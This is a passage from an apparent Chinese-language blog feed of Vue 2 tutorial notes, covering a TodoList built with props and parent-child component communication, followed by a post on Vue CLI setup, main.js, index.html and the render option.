class="hljs-comment">//对象中的key使用字符串最好，因为number有界限</span><br>      &#123;<span class="hljs-symbol">id</span>:<span class="hljs-string">&#x27;002&#x27;</span>,title:<span class="hljs-string">&#x27;睡觉&#x27;</span>,done:<span class="hljs-literal">false</span>&#125;,<br>      &#123;<span class="hljs-symbol">id</span>:<span class="hljs-string">&#x27;003&#x27;</span>,title:<span class="hljs-string">&#x27;打代码&#x27;</span>,done:<span class="hljs-literal">true</span>&#125;,<br>    ]&#125;<br>  &#125;,<br></code></pre></td></tr></table></figure><p>然后在上面的组件标签中循环</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&lt;MyItem v-<span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;todoobj in todos&quot;</span> <span class="hljs-symbol">:key=<span class="hljs-string">&quot;todoobj.id&quot;</span></span> <span class="hljs-symbol">:todo=<span class="hljs-string">&#x27;todoobj&#x27;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>同时我们也应该想到需要与<code>MyItem</code>文件进行交互，所以放入一个props</p><p>在<code>MyItem</code>进行props的接收，并使用这些数据</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-comment">&lt;!-- :checked綁定小技巧，使用数据绑定进行勾选的判断 --&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">:checked</span>=<span class="hljs-string">&#x27;todo.done&#x27;</span>/&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">todo.title</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="xml">//</span><br><span class="xml">props:[&#x27;todo&#x27;]</span><br></code></pre></td></tr></table></figure><p>这样我们在list部分的数据展示就完成了一部分了</p><h3 id="然后是我们的第二个问题：如何完成todos的添加"><a href="#然后是我们的第二个问题：如何完成todos的添加" class="headerlink" title="然后是我们的第二个问题：如何完成todos的添加"></a><em><strong>然后是我们的第二个问题：如何完成<code>todos</code>的添加</strong></em></h3><p>我们的输入框在<code>Myheader</code>中，但是我们的<code>todos</code>数组在<code>Mylist</code>中，这就需要我们的兄弟组件间传值，但是我们如果还没有学习：消息订阅，全局事件总线等</p><p>我们使用一个绕一点的方式实现：（如图），将数据交给父组件，让父组件实现中介的功能</p><p><img src="!%5B%E5%85%84%E5%BC%9F%E4%BC%A0%E5%80%BC%E9%97%B4%E6%8E%A5%E5%AE%9E%E7%8E%B0.png%5D(https://s2.loli.net/2022/04/09/He3O2BnwJjzrYTE.png" alt="兄弟传值间接实现"></p><p>第一件事情：先把<code>todos</code>放在<code>App</code>中，通过props再传给list</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gml">&lt;MyList :todos=<span class="hljs-string">&#x27;todos&#x27;</span>/&gt;<br><span class="hljs-comment">//</span><br>data() &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      todos: [<br>        &#123; <span class="hljs-symbol">id</span>: <span class="hljs-string">&quot;001&quot;</span>, title: <span class="hljs-string">&quot;吃饭&quot;</span>, done: <span class="hljs-literal">true</span> &#125;, <span class="hljs-comment">//对象中的key使用字符串最好，因为number有界限</span><br>        &#123; <span class="hljs-symbol">id</span>: <span class="hljs-string">&quot;002&quot;</span>, title: <span class="hljs-string">&quot;睡觉&quot;</span>, done: <span class="hljs-literal">false</span> &#125;,<br>        &#123; <span class="hljs-symbol">id</span>: <span class="hljs-string">&quot;003&quot;</span>, title: <span class="hljs-string">&quot;打代码&quot;</span>, done: <span class="hljs-literal">true</span> &#125;,<br>      ],<br>    &#125;;<br>  &#125;,<br></code></pre></td></tr></table></figure><p>第二件事情：在<code>App</code>中创建一个给<code>todos</code>添加对象的函数，传给<code>Myheader</code>，然后<code>Myheader</code>使用<code>App</code>传过来的函数，实现input与<code>todos</code>之间的传值</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">//input框</span><br>&lt;input<br>      type=<span class="hljs-string">&quot;text&quot;</span><br>      placeholder=<span class="hljs-string">&quot;请输入你的任务名称，按回车键确认&quot;</span><br>      v-model=<span class="hljs-string">&quot;title&quot;</span><br>      <span class="hljs-meta">@keyup</span>.enter=<span class="hljs-string">&quot;addtodos&quot;</span><br>    /&gt;<br><br><span class="hljs-comment">//script部分</span><br>    <span class="hljs-keyword">data</span>() &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      title: <span class="hljs-string">&quot;&quot;</span>,<br>    &#125;;<br>  &#125;,<br>  <span class="hljs-comment">//添加todo的函数</span><br>  methods: &#123;<br>    addtodos() &#123;<br>      <span class="hljs-comment">// 判断输入格式，trim消除空格</span><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.title.trim()) <span class="hljs-keyword">return</span> alert(<span class="hljs-string">&quot;请输入事项&quot;</span>);<br>      <span class="hljs-keyword">const</span> t = &#123; id: nanoid(), title: <span class="hljs-keyword">this</span>.title, done: <span class="hljs-literal">false</span> &#125;;<span class="hljs-comment">//nanoid()是一个库，生成唯一的id</span><br>      <span class="hljs-keyword">this</span>.receive(t);<br>      <span class="hljs-keyword">this</span>.title = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//输入完成后清空</span><br>    &#125;,<br>  &#125;,<br>  props: [<span class="hljs-string">&quot;receive&quot;</span>],<br></code></pre></td></tr></table></figure><p>第三件事情：<code>App</code>接收到<code>MyHeader</code>传入的数据，并传给<code>todos</code>数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//App组件中的receive</span><br><span class="hljs-attr">methods</span>: &#123;<br>   <span class="hljs-function"><span class="hljs-title">receive</span>(<span class="hljs-params">todoobj</span>)</span>&#123;<br>     <span class="hljs-built_in">this</span>.todos.unshift(todoobj);<span class="hljs-comment">//拿到todoobj并传入todos数组</span><br>   &#125;<br> &#125;,<br></code></pre></td></tr></table></figure><p>这样我们就实现了兄弟组件之间的传值。</p><p><em><strong>第三个需求，我们实现勾选和取消勾选</strong></em></p><p>首先在<code>MyItem</code>的勾选框当中绑定点击或者改变(change)事件，通过该事件拿到该todo的id</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-comment">//MyItem组件</span><br><span class="hljs-variable">@change</span>=<span class="hljs-string">&quot;handler(todo.id)&quot;</span><br><span class="hljs-comment">//</span><br> <span class="hljs-attribute">methods</span>: &#123;<br>    <span class="hljs-selector-tag">handler</span>(id)&#123;<br>      <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.checktodo</span>(id);<span class="hljs-comment">//传回checktodo也就是返回上级</span><br>    &#125;<br>  &#125;,<br></code></pre></td></tr></table></figure><p>但是我们的<code>todos</code>对象在<code>App</code>组件当中,所以我们如果要操作todos需要回到App组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//App组件</span><br><span class="hljs-function"><span class="hljs-title">checktodo</span>(<span class="hljs-params">id</span>)</span>&#123;<br>      <span class="hljs-built_in">this</span>.todos.forEach(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> &#123;<span class="hljs-comment">//循环遍历todos</span><br>        <span class="hljs-keyword">if</span>(todo.id==id)&#123;<br>          todo.done=!todo.done;实现取反<br>        &#125;<br>      &#125;);<br>    &#125;<br></code></pre></td></tr></table></figure><p>通过props将<code>checktodo</code>传给<code>MyList</code>然后<code>MyList</code>再传给<code>MyItem</code>实现<code>checktodo</code>的传参</p><p>tips:第二种方法：但是不建议</p><p>我们只在<code>MyItem</code>的input里面修改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attribute">v-model</span>=<span class="hljs-string">&#x27;todo.done&#x27;</span>/&gt;<br></code></pre></td></tr></table></figure><p>双向绑定<code>todo.done</code>,这样我们便是改变了props中的数据，但是有深度的改变的（参考深度监视）,所以不会报错。</p><h3 id="第四个需求，删除效果"><a href="#第四个需求，删除效果" class="headerlink" title="第四个需求，删除效果"></a><em><strong>第四个需求，删除效果</strong></em></h3><p>这个需求完成起来比较简单 =&gt; 思路就是 </p><p>1.在MyItem中拿到id</p><p>2.在App中拿到todos并设置过滤器，重新赋值todos</p><p>3.将App中拿到的函数传给MyList再传给MyItem，然后MyItem传参</p><p>关键代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//App中</span><br><span class="hljs-function"><span class="hljs-title">deletetodo</span><span class="hljs-params">(id)</span></span>&#123;<span class="hljs-comment">//重新赋值</span><br>      this<span class="hljs-selector-class">.todos</span> = this<span class="hljs-selector-class">.todos</span><span class="hljs-selector-class">.filter</span>(todo =&gt; todo.id!==id)<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//MyItem中</span><br><span class="hljs-function"><span class="hljs-title">handleDelete</span>(<span class="hljs-params">id</span>)</span>&#123;<br>      <span class="hljs-keyword">if</span>(confirm(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>))&#123;<br>        <span class="hljs-comment">//通知App删除</span><br>        <span class="hljs-built_in">this</span>.deletetodo(id);<br>      &#125;<br>    &#125;<br>  &#125;,<br></code></pre></td></tr></table></figure><h3 id="第五个需求，计算完成事项个数"><a href="#第五个需求，计算完成事项个数" class="headerlink" title="第五个需求，计算完成事项个数"></a><em><strong>第五个需求，计算完成事项个数</strong></em></h3><p>我们需要使用计算属性计算 done为true的 todo有多少个</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>已完成</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">doneTotal</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> / 全部</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">todos.length</span> &#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这里主要介绍一个数组里面常用的reduce方法，过滤返回</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">//计算属性中的函数</span><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.todos.reduce((pre, current) =&gt; &#123;<br><br>​    <span class="hljs-comment">//第一次调用pre为0，第二次pre为第一次的返回值，current是每一次todo项</span><br><br>​    <span class="hljs-keyword">return</span> pre + (current.done ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>); <span class="hljs-comment">//最后一次的返回值是reduce的返回值，之前的都是返回作为pre的值</span><br><br>   &#125;, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>或者也可以使用filter</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.todos.filter(<span class="hljs-function"><span class="hljs-params">(todo)</span>=&gt;</span> todo.done===<span class="hljs-literal">true</span>).length<span class="hljs-regexp">//</span>改变原数组报错<br></code></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="第六个需求，实现全部完成打钩和清空"><a href="#第六个需求，实现全部完成打钩和清空" class="headerlink" title="第六个需求，实现全部完成打钩和清空"></a><em>第六个需求，实现全部完成打钩</em>和清空</h3><p>一 . 打钩这里有两个方法</p><p>第一个方法：</p><p>在最后的勾选框里面绑定点击事件，获取他的checked值，然后回到App用一个函数操作todos，函数的值通过MyFooter里面传参得到。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">//MyFooter</span><br>&lt;input <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> :checked=<span class="hljs-string">&quot;isAll&quot;</span> <span class="hljs-meta">@change</span>=<span class="hljs-string">&quot;checkAll&quot;</span> /&gt; <br><span class="hljs-comment">//计算属性</span><br><span class="hljs-function"><span class="hljs-title">isAll</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doneTotal === <span class="hljs-built_in">this</span>.total &amp;&amp; <span class="hljs-built_in">this</span>.total&gt;<span class="hljs-number">0</span><br>    &#125;<br> <span class="hljs-comment">//方法</span><br>    <span class="hljs-attr">methods</span>: &#123;<br>    <span class="hljs-function"><span class="hljs-title">checkAll</span>(<span class="hljs-params">e</span>)</span> &#123;<br>      <span class="hljs-comment">// 这里的e.target拿到最后的勾选框</span><br>       <span class="hljs-built_in">console</span>.log(e.target.checked);<br>       <span class="hljs-built_in">this</span>.checkAllTodo(e.target.checked);<br>     &#125;,<br>   &#125;,<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//App组件</span><br>check<span class="hljs-constructor">AllTodo(<span class="hljs-params">done</span>)</span> &#123;<br>      <span class="hljs-comment">//全选函数</span><br>      this.todos.<span class="hljs-keyword">for</span><span class="hljs-constructor">Each((<span class="hljs-params">todo</span>)</span> =&gt; &#123;<br>        todo.<span class="hljs-keyword">done</span> = <span class="hljs-keyword">done</span>;<br>      &#125;);<br>    &#125;,<br></code></pre></td></tr></table></figure><p>第二种方法：</p><p>通过v-model双向绑定，计算属性的拓展形式，set修改时，就可以调用<code>checkAlltodo</code>，而且传参就是value</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">&lt;input type=<span class="hljs-string">&quot;checkbox&quot;</span> v-model=<span class="hljs-string">&quot;isAll&quot;</span> /&gt;<br><span class="hljs-comment">//</span><br>isAll: &#123;<br>      <span class="hljs-keyword">get</span>() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.doneTotal === <span class="hljs-keyword">this</span>.total &amp;&amp; <span class="hljs-keyword">this</span>.total &gt; <span class="hljs-number">0</span>;<br>      &#125;,<br>      <span class="hljs-keyword">set</span>(value) &#123;<br>        <span class="hljs-keyword">this</span>.checkAllTodo(value);<span class="hljs-comment">//checked被修改了调用，这里因为是isAll的计算属性，所以直接拿到value</span><br>      &#125;,<br>    &#125;,<br></code></pre></td></tr></table></figure><p>二 . 全部清空</p><p>实现全部清空，就给全部清空按钮绑定click事件，同理操作todos数组的方法交给App，MyFooter只负责传参</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//App中的方法</span><br><span class="hljs-function"><span class="hljs-title">clearAllTodo</span>(<span class="hljs-params"></span>)</span> &#123;<br>      <span class="hljs-built_in">this</span>.todos = <span class="hljs-built_in">this</span>.todos.filter(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> &#123;<span class="hljs-comment">//进行遍历，如果return 结果为true则留下来</span><br>         <span class="hljs-keyword">return</span> !todo.done;<br>      &#125;);<br>    &#125;,<br><span class="hljs-comment">//props转到MyFooter中调用</span><br> <span class="hljs-function"><span class="hljs-title">clear</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//clear为绑定的点击事件</span><br>      <span class="hljs-built_in">this</span>.clearAllTodo();<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="part-three-总结"><a href="#part-three-总结" class="headerlink" title="part three . 总结"></a>part three . 总结</h2><p>1.我们首先接触的便是组件化的编码流程，将组件根据功能点拆分，</p><p>2.实现动态组件：考虑好数据存放的位置，比如todos这个数组因为很多组件都会用到，那么我们就放在我们的最大组件App当中<strong>（状态提升）</strong>，如果对于一些只有单个组价在使用的数据，那么放在这个组件当中就可以了。</p><p>3.props在我们这个案例中实现了组件间交流的作用，但是对于子组件给父组件传值，我们需要父组件先给子组件一个函数，子组件通过函数传参。</p><p>4.使用v-model时，注意双向绑定的含义，绑定的值可以是计算属性，函数中会用到的值（总的来说就是你需要获取他的变化和他的变化要影响你的数据展示）。最好绑定的值不是props中 的，因为props中会有浅层次的数据监视。</p><p>5.几个数组方法，reduce，filter，unshift，简写形式，如何简化代码，我们需要思考，不能一上来就是一堆代码，很不好看，也很麻烦。</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue脚手架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vue脚手架</title>
    <link href="/2022/03/28/vue%E8%84%9A%E6%89%8B%E6%9E%B6/"/>
    <url>/2022/03/28/vue%E8%84%9A%E6%89%8B%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<p>在vue编程当中我们因为单文件组件的引入，需要在一个框架当中执行，而vue团队便给我们提供了这样一个编译流——vuecli</p><span id="more"></span><h1 id="vue脚手架"><a href="#vue脚手架" class="headerlink" title="vue脚手架"></a>vue脚手架</h1><h2 id="一-脚手架的安装"><a href="#一-脚手架的安装" class="headerlink" title="一 . 脚手架的安装"></a>一 . 脚手架的安装</h2><p><img src="https://s2.loli.net/2022/03/28/tKa4LpgbRBows9Q.png" alt="安装脚手架.png"></p><p>为了万无一失，我们都先配置一下淘宝镜像，然后<code>npm install</code>,我们再重新打开cmd，<code>cd Desktop</code>到我们的桌面，输入<code>mkdir demo</code>如果桌面上出现了demo文件夹那么说明切换成功，就可以执行<code>vue create  文件名</code>了</p><h2 id="二-分析脚手架"><a href="#二-分析脚手架" class="headerlink" title="二 . 分析脚手架"></a>二 . 分析脚手架</h2><p>配置文件我们先不谈</p><p>首先是main.js里面的内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 文件是整个项目的入口文件</span><br><span class="hljs-comment">// 引入Vue</span><br><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span>;<br><br>Vue.config.productionTip=<span class="hljs-literal">false</span><br><br><span class="hljs-keyword">new</span> Vue(&#123;<br>    <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#root&quot;</span>,<br>    <span class="hljs-comment">//render实现App的载入</span><br>    <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> h(App),<br>&#125;)<br></code></pre></td></tr></table></figure><p>main是项目的入口文件，与一般的main不同，我们要先引入vue，然后是使用render</p><p>其他的.vue文件与之前的差别不大，我们直接将之前写的拖入注意<App>要放在components外面管理里面的小弟</p><p>但是index的html文件中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 以最高级别渲染vue项目 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 开启移动端的理想视口 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- BASE_URL %便是public目录下 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>&lt;%= htmlWebpackPlugin.options.title %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 当浏览器不支持js时，&lt;noscript&gt;标签里面的内容就会显示 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span>sorry your web not support js<span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 容器 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">App</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">App</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 一定在模板之后加入文件引入 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;../../js/vue.js&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;main.js&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>几个<head>配置项需要注意，已经进行了注释</p><p><strong>还有就是一定要注意路径的有没有写错</strong></p><p>之后我们使用Ctrl和~键就可以在vscode中打开cmd，输入<code>npm run serve</code>就可以在8080端口打开我们的文件了</p><h2 id="三-render配置项"><a href="#三-render配置项" class="headerlink" title="三 . render配置项"></a>三 . render配置项</h2><p>在我们的脚手架中，new vue中注册App的时候我们加入的不是template还有components，而是使用了render配置项代替。那么这个render配置项的作用是什么呢？</p><p>我们首先使用原来的写法尝试</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><span class="hljs-comment">//Question</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span>;<br><br>Vue.config.productionTip=<span class="hljs-keyword">false</span><br><br><span class="hljs-keyword">new</span> Vue(&#123;<br>    el: <span class="hljs-string">&quot;#root&quot;</span>,<br>    <span class="hljs-comment">//写入模板，在html文件中就可以不用再在div中加app了</span><br>    <span class="hljs-comment">// render: h =&gt; h(App),</span><br>    template:`<br>    &lt;<span class="hljs-keyword">div</span>&gt;hello&lt;/<span class="hljs-keyword">div</span>&gt;<br>    `<br>&#125;)<br></code></pre></td></tr></table></figure><p>得到的结果便是页面不显示，vue报错</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">vue.runtime.esm.js?c320:<span class="hljs-number">619</span> [Vue warn]: You are <span class="hljs-keyword">using</span> the runtime-<span class="hljs-keyword">only</span> build <span class="hljs-keyword">of</span> Vue <span class="hljs-keyword">where</span> the <span class="hljs-keyword">template</span> compiler <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> available. Either pre-compile the templates <span class="hljs-keyword">into</span> render <span class="hljs-keyword">functions</span>, <span class="hljs-keyword">or</span> use the compiler-included build.<br><br>(<span class="hljs-built_in">found</span> <span class="hljs-keyword">in</span> &lt;Root&gt;)<br></code></pre></td></tr></table></figure><p>其中这个错误，便是问题的核心==》它说我们使用了runtime-only的vue==》所以我们的问题在于引入的vue上面</p><p>我们第一行引入的vue其实是vue.runtime.ems.js，也就是vue.js的化简版，正常的vue包含了核心和模板解析器，而我们引入的版本没有了模块解析器（通过这样减小文件体积），所以我们的template也就理所应当的失效了。</p><p>于是我们拥有了render()，而render()就像一个临时的模板解析器，为我们提供模板解析服务</p><p>render开始的写法是一个函数</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">render(creatElement)&#123;<span class="hljs-regexp">//</span>接受参数是一个<span class="hljs-keyword">function</span><br>return creatElement(<span class="hljs-string">&#x27;h1&#x27;</span>,<span class="hljs-string">&#x27;hello&#x27;</span>)<span 